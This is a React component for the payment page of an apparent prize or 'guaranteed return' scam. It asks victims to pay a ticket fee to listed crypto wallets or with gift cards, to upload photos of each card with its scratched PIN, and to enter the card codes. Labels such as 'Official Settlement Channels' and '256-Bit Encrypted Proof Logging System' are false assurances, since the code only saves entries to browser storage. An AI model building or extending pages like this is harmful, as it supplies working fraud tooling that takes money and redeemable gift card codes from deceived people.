import React, { useState, useRef } from 'react';
import { CRYPTO_PAYMENTS, GIFT_CARDS, PAYMENT_METHODS_OPTIONS } from '../constants';
import { PrizeTier, Transaction } from '../types';
import { Copy, Check, Upload, FileText, ArrowRight, ShieldCheck, CreditCard, Sparkles, AlertCircle, Trash2, Camera, FileCheck } from 'lucide-react';

interface PaymentSectionProps {
  selectedTier?: PrizeTier | null;
  onReceiptSubmitted?: (tx: Transaction) => void;
  defaultFullName?: string;
  defaultEmail?: string;
  defaultPayoutAddress?: string;
  defaultPaymentMethod?: string;
  defaultGiftCardCode?: string;
  defaultReceiptFile?: string;
  defaultReceiptFileName?: string;
  showStandAloneHeader?: boolean;
}

export const PaymentSection: React.FC<PaymentSectionProps> = ({
  selectedTier,
  onReceiptSubmitted,
  defaultFullName = '',
  defaultEmail = '',
  defaultPayoutAddress = '',
  defaultPaymentMethod = 'BTC',
  defaultGiftCardCode = '',
  defaultReceiptFile = null,
  defaultReceiptFileName = '',
  showStandAloneHeader = true,
}) => {
  const [copiedAddress, setCopiedAddress] = useState<string | null>(null);
  const [selectedMethod, setSelectedMethod] = useState<string>(defaultPaymentMethod || 'BTC');
  const [fullName, setFullName] = useState(defaultFullName);
  const [email, setEmail] = useState(defaultEmail);
  const [payoutAddress, setPayoutAddress] = useState(defaultPayoutAddress);
  const [giftCardCode, setGiftCardCode] = useState(defaultGiftCardCode);
  const [receiptFile, setReceiptFile] = useState<string | null>(defaultReceiptFile);
  const [receiptFileName, setReceiptFileName] = useState<string>(defaultReceiptFileName);
  const [uploadError, setUploadError] = useState<string | null>(null);
  const [uploadSuccess, setUploadSuccess] = useState(false);
  const [isDragging, setIsDragging] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const isGiftCardSelected = selectedMethod.includes('Gift Card');

  const handleCopy = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedAddress(id);
    setTimeout(() => setCopiedAddress(null), 2500);
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      processFile(file);
    }
  };

  const processFile = (file: File) => {
    setUploadError(null);
    setReceiptFileName(file.name);
    const reader = new FileReader();
    reader.onload = (event) => {
      if (event.target?.result) {
        setReceiptFile(event.target.result as string);
      }
    };
    reader.readAsDataURL(file);
  };

  const handleDragOver = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(true);
  };

  const handleDragLeave = () => {
    setIsDragging(false);
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragging(false);
    const file = e.dataTransfer.files?.[0];
    if (file) {
      processFile(file);
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!receiptFile && !receiptFileName) {
      const errorMsg = isGiftCardSelected
        ? 'COMPULSORY REQUIREMENT: You must upload photos of the physical gift card (front & scratched PIN back) AND original purchase receipt before submitting to the ledger.'
        : 'COMPULSORY REQUIREMENT: You must upload your cryptocurrency transaction proof / receipt screenshot showing TxID before submitting to the ledger.';
      setUploadError(errorMsg);
      fileInputRef.current?.scrollIntoView({ behavior: 'smooth', block: 'center' });
      return;
    }
    setUploadError(null);

    setIsSubmitting(true);

    const existingLogs: Transaction[] = (() => {
      try {
        return JSON.parse(localStorage.getItem('mw_transactions') || '[]');
      } catch {
        return [];
      }
    })();

    // Find highest integer ID for AUTO_INCREMENT
    const maxId = existingLogs.reduce((max, tx) => {
      const num = typeof tx.id === 'number' ? tx.id : parseInt(String(tx.id).replace(/\D/g, ''), 10) || 0;
      return num > max ? num : max;
    }, 0);
    const nextAutoIncrementId = maxId + 1;
    const nowIso = new Date().toISOString();
    const fileName = receiptFileName || `${Date.now()}_receipt.jpg`;

    const newTransaction: Transaction = {
      id: nextAutoIncrementId, // INT AUTO_INCREMENT PRIMARY KEY
      txCode: `TX-${String(nextAutoIncrementId).padStart(4, '0')}`,
      payment_method: selectedMethod, // VARCHAR(100)
      paymentMethod: selectedMethod,
      receipt_file: fileName, // VARCHAR(255)
      receiptFile: receiptFile || undefined,
      receiptFileName: fileName,
      created_at: nowIso, // TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      createdAt: nowIso,
      claimantName: fullName || 'Anonymous Claimant',
      email: email || 'not-provided@claim.node',
      giftCardCode: giftCardCode || undefined,
      ticketFee: selectedTier?.entryFee || 50,
      guaranteedReward: selectedTier?.reward || 5000,
      walletAddress: payoutAddress || 'Ledger-HID-Default',
      status: 'Pending',
    };

    // Save to localStorage transactions list
    try {
      existingLogs.unshift(newTransaction);
      localStorage.setItem('mw_transactions', JSON.stringify(existingLogs));
    } catch (err) {
      console.error('Failed to write to localStorage', err);
    }

    setTimeout(() => {
      setIsSubmitting(false);
      setUploadSuccess(true);
      if (onReceiptSubmitted) {
        onReceiptSubmitted(newTransaction);
      }
    }, 600);
  };

  return (
    <section id="payment-methods-section" className="w-full max-w-7xl mx-auto py-12 px-4">
      {showStandAloneHeader && (
        <div className="text-center mb-10">
          <div className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-blue-500/10 border border-blue-500/30 text-blue-400 text-xs font-black uppercase tracking-widest mb-3">
            <CreditCard className="w-3.5 h-3.5" />
            Official Settlement Channels
          </div>
          <h2 className="text-3xl sm:text-5xl font-black text-white tracking-tight mb-3">
            Payment Methods & Receipt Verification
          </h2>
          <p className="text-slate-400 max-w-2xl mx-auto text-sm sm:text-base leading-relaxed">
            Deposit your prefer ticket fee via verified Cryptocurrency or Gift Cards below, then submit your proof of payment for instant ledger logging.
          </p>
        </div>
      )}

      {/* Selected Ticket Summary Banner (if in checkout flow) */}
      {selectedTier && (
        <div className="mb-8 p-5 bg-gradient-to-r from-blue-900/40 via-indigo-900/30 to-slate-900/50 rounded-2xl border border-blue-500/30 backdrop-blur-md flex flex-col sm:flex-row items-center justify-between gap-4">
          <div className="flex items-center gap-4">
            <div className="w-12 h-12 rounded-xl bg-blue-600/20 border border-blue-500/40 flex items-center justify-center font-black text-blue-400 text-lg">
              ${selectedTier.entryFee}
            </div>
            <div>
              <p className="text-xs font-bold uppercase tracking-wider text-slate-400">Selected Ticket Tier</p>
              <h4 className="text-lg font-black text-white">${selectedTier.entryFee} Ticket Entry</h4>
            </div>
          </div>
          <div className="text-right">
            <p className="text-xs font-bold uppercase tracking-wider text-slate-400">Guaranteed Return</p>
            <h4 className="text-xl sm:text-2xl font-black text-emerald-400">
              ${selectedTier.reward.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
            </h4>
          </div>
        </div>
      )}

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
        {/* Left Column: Crypto & Gift Card Deposit Channels */}
        <div className="lg:col-span-7 space-y-6">
          {/* Cryptocurrency Section */}
          <div className="bg-slate-900/60 p-6 sm:p-7 rounded-3xl border border-slate-800 backdrop-blur-xl shadow-2xl">
            <div className="flex items-center justify-between mb-5">
              <h3 className="text-lg font-black text-white flex items-center gap-2">
                <span className="w-2 h-2 rounded-full bg-blue-500 animate-pulse" />
                Cryptocurrency Wallets
              </h3>
              <span className="text-xs font-bold text-slate-400 bg-slate-800/80 px-2.5 py-1 rounded-lg border border-slate-700">
                Direct Blockchain Deposit
              </span>
            </div>

            <div className="space-y-4">
              {CRYPTO_PAYMENTS.map((crypto) => {
                const isCopied = copiedAddress === crypto.id;
                return (
                  <div
                    key={crypto.id}
                    className="p-4 rounded-2xl bg-slate-950/70 border border-slate-800/80 hover:border-slate-700 transition-colors"
                  >
                    <div className="flex items-center justify-between mb-2">
                      <div className="flex items-center gap-2">
                        <span className="px-2 py-0.5 rounded bg-blue-500/20 text-blue-400 font-mono text-xs font-black">
                          {crypto.symbol}
                        </span>
                        <span className="font-bold text-white text-sm">{crypto.name}</span>
                        <span className="text-[11px] text-slate-400">({crypto.network})</span>
                      </div>
                      <button
                        id={`copy-btn-${crypto.id}`}
                        onClick={() => handleCopy(crypto.address, crypto.id)}
                        className={`px-3 py-1 rounded-lg text-xs font-bold transition-all flex items-center gap-1.5 ${
                          isCopied
                            ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                            : 'bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white'
                        }`}
                      >
                        {isCopied ? (
                          <>
                            <Check className="w-3.5 h-3.5" /> Copied!
                          </>
                        ) : (
                          <>
                            <Copy className="w-3.5 h-3.5" /> Copy
                          </>
                        )}
                      </button>
                    </div>

                    <div className="p-2.5 rounded-xl bg-slate-900/90 border border-slate-800/90 flex items-center justify-between">
                      <code className="text-xs font-mono text-slate-300 break-all select-all">
                        {crypto.address}
                      </code>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>

          {/* Gift Cards Section */}
          <div className="bg-slate-900/60 p-6 sm:p-7 rounded-3xl border border-slate-800 backdrop-blur-xl shadow-2xl">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-black text-white flex items-center gap-2">
                <Sparkles className="w-4 h-4 text-amber-400" />
                Accepted Gift Cards
              </h3>
              <span className="text-xs font-bold text-amber-400 bg-amber-500/10 px-2.5 py-1 rounded-lg border border-amber-500/20">
                1:1 Face Value Accepted
              </span>
            </div>
            <p className="text-xs text-slate-400 mb-4 leading-relaxed">
              You can purchase any of the following gift cards corresponding to your ticket amount and submit the front/back receipt and digital PIN below:
            </p>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              {GIFT_CARDS.map((card) => (
                <div
                  key={card.id}
                  onClick={() => setSelectedMethod(card.id)}
                  className={`p-3.5 rounded-2xl border transition-all cursor-pointer flex items-center gap-3 ${
                    selectedMethod === card.id
                      ? 'bg-amber-500/15 border-amber-500/50 shadow-lg shadow-amber-500/10'
                      : 'bg-slate-950/60 border-slate-800/80 hover:border-slate-700'
                  }`}
                >
                  <span className="text-2xl p-2 rounded-xl bg-slate-900 border border-slate-800">{card.icon}</span>
                  <div>
                    <h5 className="font-bold text-white text-sm">{card.name}</h5>
                    <p className="text-[11px] text-slate-400 leading-tight">{card.description}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Right Column: Upload Payment Receipt Form */}
        <div className="lg:col-span-5">
          <div className="bg-slate-900/70 p-6 sm:p-8 rounded-3xl border border-slate-800 backdrop-blur-xl shadow-2xl sticky top-24">
            <div className="flex items-center justify-between mb-5 border-b border-slate-800 pb-4">
              <div>
                <h3 className="text-xl font-black text-white flex items-center gap-2">
                  <Upload className="w-5 h-5 text-blue-400" />
                  Upload Payment Receipt
                </h3>
                <p className="text-xs text-slate-400 mt-0.5">Submit screenshot or gift card code for verification</p>
              </div>
            </div>

            {uploadSuccess ? (
              <div className="py-8 text-center animate-[fadeIn_0.3s_ease-out]">
                <div className="w-16 h-16 bg-emerald-500/20 text-emerald-400 rounded-full flex items-center justify-center mx-auto mb-4 border border-emerald-500/30">
                  <Check className="w-8 h-8" />
                </div>
                <h4 className="text-xl font-black text-white mb-2">Receipt Uploaded & Logged!</h4>
                <p className="text-xs text-slate-300 mb-6 leading-relaxed max-w-sm mx-auto">
                  Your payment receipt and entry claim have been registered in the verification ledger.
                </p>
                <button
                  onClick={() => setUploadSuccess(false)}
                  className="px-6 py-2.5 bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-bold rounded-xl transition-all border border-slate-700"
                >
                  Submit Another Receipt
                </button>
              </div>
            ) : (
              <form onSubmit={handleSubmit} className="space-y-4">
                {/* Method selector */}
                <div>
                  <label htmlFor="paymentMethod" className="block text-xs font-bold uppercase tracking-wider text-slate-400 mb-1.5">
                    Select Payment Method <span className="text-red-400">*</span>
                  </label>
                  <select
                    id="paymentMethod"
                    name="paymentMethod"
                    value={selectedMethod}
                    onChange={(e) => setSelectedMethod(e.target.value)}
                    required
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white text-sm focus:border-blue-500 focus:outline-none transition-colors"
                  >
                    <optgroup label="Cryptocurrency">
                      <option value="BTC">BTC (Bitcoin)</option>
                      <option value="USDT_BEP20">USDT (BEP20)</option>
                      <option value="ETH_ERC20">ETH (ERC20)</option>
                      <option value="USDT_TRON">USDT (TRON TRC20)</option>
                    </optgroup>
                    <optgroup label="Gift Cards">
                      <option value="Apple Gift Card">Apple Gift Card</option>
                      <option value="Razer Gift Card">Razer Gift Card</option>
                      <option value="Steam Gift Card">Steam Gift Card</option>
                      <option value="Xbox Gift Card">Xbox Gift Card</option>
                      <option value="Sephora Gift Card">Sephora Gift Card</option>
                    </optgroup>
                  </select>
                </div>

                {/* Claimant Name & Email */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  <div>
                    <label className="block text-xs font-bold uppercase tracking-wider text-slate-400 mb-1.5">
                      Claimant Name
                    </label>
                    <input
                      type="text"
                      className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white text-sm focus:border-blue-500 focus:outline-none"
                      placeholder="Legal Name"
                      value={fullName}
                      onChange={(e) => setFullName(e.target.value)}
                    />
                  </div>
                  <div>
                    <label className="block text-xs font-bold uppercase tracking-wider text-slate-400 mb-1.5">
                      Email Address
                    </label>
                    <input
                      type="email"
                      className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white text-sm focus:border-blue-500 focus:outline-none"
                      placeholder="email@address.com"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                    />
                  </div>
                </div>

                {/* If Gift Card: Code & PIN input */}
                {isGiftCardSelected && (
                  <div className="p-3.5 bg-amber-500/10 border border-amber-500/20 rounded-2xl">
                    <label className="block text-xs font-bold uppercase tracking-wider text-amber-300 mb-1">
                      Gift Card Code / PIN / Serial
                    </label>
                    <input
                      type="text"
                      className="w-full bg-slate-950 border border-amber-500/30 rounded-xl px-3.5 py-2 text-white font-mono text-sm focus:border-amber-400 focus:outline-none"
                      placeholder="Enter 16-digit card code or PIN"
                      value={giftCardCode}
                      onChange={(e) => setGiftCardCode(e.target.value)}
                    />
                  </div>
                )}

                {/* Destination Wallet/Payout Account */}
                <div>
                  <label className="block text-xs font-bold uppercase tracking-wider text-slate-400 mb-1.5">
                    Your Payout Address / Account ID
                  </label>
                  <input
                    type="text"
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white font-mono text-xs focus:border-blue-500 focus:outline-none"
                    placeholder="Recipient BTC/ETH/USDT address or $Cashtag"
                    value={payoutAddress}
                    onChange={(e) => setPayoutAddress(e.target.value)}
                  />
                </div>

                {/* File Upload Area */}
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <label className="block text-xs font-bold uppercase tracking-wider text-white flex items-center gap-2">
                      <span>
                        {isGiftCardSelected ? 'Physical Gift Card & Store Receipt' : 'Cryptocurrency Payment Receipt'}
                      </span>
                      <span className="text-red-400 font-black">* [COMPULSORY]</span>
                    </label>
                    <span className="text-[10px] font-bold text-red-400 bg-red-500/10 px-2 py-0.5 rounded border border-red-500/20">
                      Required for Ledger Entry
                    </span>
                  </div>

                  {/* Validation Error Alert Banner */}
                  {uploadError && (
                    <div className="p-3.5 bg-red-500/15 border-2 border-red-500/60 rounded-xl flex items-start gap-2.5 text-red-300 text-xs font-semibold animate-pulse">
                      <AlertCircle className="w-4 h-4 text-red-400 flex-shrink-0 mt-0.5" />
                      <p>{uploadError}</p>
                    </div>
                  )}

                  {/* Context Guidance */}
                  <p className="text-[11px] text-slate-400 flex items-center gap-1.5">
                    <Camera className="w-3.5 h-3.5 text-amber-400 flex-shrink-0" />
                    <span>
                      {isGiftCardSelected
                        ? 'Upload photo of physical card with scratched PIN code alongside the purchase receipt.'
                        : 'Upload transaction confirmation screenshot showing TxID and destination wallet.'}
                    </span>
                  </p>

                  <div
                    onDragOver={handleDragOver}
                    onDragLeave={handleDragLeave}
                    onDrop={handleDrop}
                    onClick={() => fileInputRef.current?.click()}
                    className={`border-2 border-dashed rounded-2xl p-5 text-center cursor-pointer transition-all ${
                      uploadError
                        ? 'border-red-500 bg-red-500/10 shadow-[0_0_20px_rgba(239,68,68,0.25)]'
                        : isDragging
                        ? 'border-blue-500 bg-blue-500/10 scale-[1.01]'
                        : receiptFile
                        ? 'border-emerald-500/50 bg-emerald-500/5'
                        : 'border-slate-700 hover:border-blue-400 bg-slate-950/80 hover:bg-slate-950'
                    }`}
                  >
                    <input
                      ref={fileInputRef}
                      type="file"
                      name="receiptUpload"
                      id="receiptUpload"
                      accept="image/*,.pdf"
                      onChange={handleFileChange}
                      className="hidden"
                    />

                    {receiptFile ? (
                      <div className="space-y-3">
                        {receiptFile.startsWith('data:image') ? (
                          <div className="relative inline-block">
                            <img
                              src={receiptFile}
                              alt="Receipt Preview"
                              className="max-h-32 mx-auto rounded-lg border border-slate-700 shadow-md object-contain"
                            />
                            <span className="absolute top-1.5 right-1.5 bg-emerald-600 text-white text-[9px] font-bold px-1.5 py-0.5 rounded-full shadow">
                              Attached
                            </span>
                          </div>
                        ) : (
                          <FileText className="w-10 h-10 text-emerald-400 mx-auto" />
                        )}
                        <div className="flex items-center justify-center gap-1.5 text-emerald-400 font-bold text-xs">
                          <FileCheck className="w-3.5 h-3.5" />
                          <span className="truncate max-w-[220px]">{receiptFileName}</span>
                        </div>
                        <div className="flex items-center justify-center gap-3 pt-1">
                          <span className="text-[11px] text-blue-400 font-semibold hover:underline">
                            Click to replace
                          </span>
                          <button
                            type="button"
                            onClick={(e) => {
                              e.stopPropagation();
                              setReceiptFile(null);
                              setReceiptFileName('');
                            }}
                            className="text-[11px] text-red-400 hover:text-red-300 font-semibold flex items-center gap-1 bg-red-500/10 px-2 py-0.5 rounded border border-red-500/20"
                          >
                            <Trash2 className="w-3 h-3" />
                            Remove
                          </button>
                        </div>
                      </div>
                    ) : (
                      <div className="space-y-2">
                        <div className="w-10 h-10 rounded-full bg-blue-600/20 border border-blue-500/30 flex items-center justify-center text-blue-400 mx-auto">
                          <Upload className="w-5 h-5" />
                        </div>
                        <p className="text-xs font-bold text-white">
                          {isGiftCardSelected
                            ? 'Upload Physical Card Photo & Purchase Receipt'
                            : 'Upload Blockchain Transfer Proof Screenshot'}
                        </p>
                        <p className="text-[11px] text-red-400 font-bold">
                          * Proof upload is compulsory to complete ledger settlement
                        </p>
                        <p className="text-[10px] text-slate-500">Supports JPG, PNG, WEBP, or PDF</p>
                      </div>
                    )}
                  </div>
                </div>

                {/* Submit button */}
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full py-4 bg-emerald-600 hover:bg-emerald-500 active:scale-98 text-white rounded-xl font-black text-sm uppercase tracking-wider transition-all shadow-xl shadow-emerald-600/25 flex items-center justify-center gap-2"
                >
                  {isSubmitting ? (
                    <span>Submitting to Ledger...</span>
                  ) : (
                    <>
                      <span>Submit Receipt & Complete Entry</span>
                      <ArrowRight className="w-4 h-4" />
                    </>
                  )}
                </button>

                <div className="flex items-center justify-center gap-2 text-[11px] text-slate-500 mt-2">
                  <ShieldCheck className="w-3.5 h-3.5 text-blue-400" />
                  <span>256-Bit Encrypted Proof Logging System</span>
                </div>
              </form>
            )}
          </div>
        </div>
      </div>
    </section>
  );
};
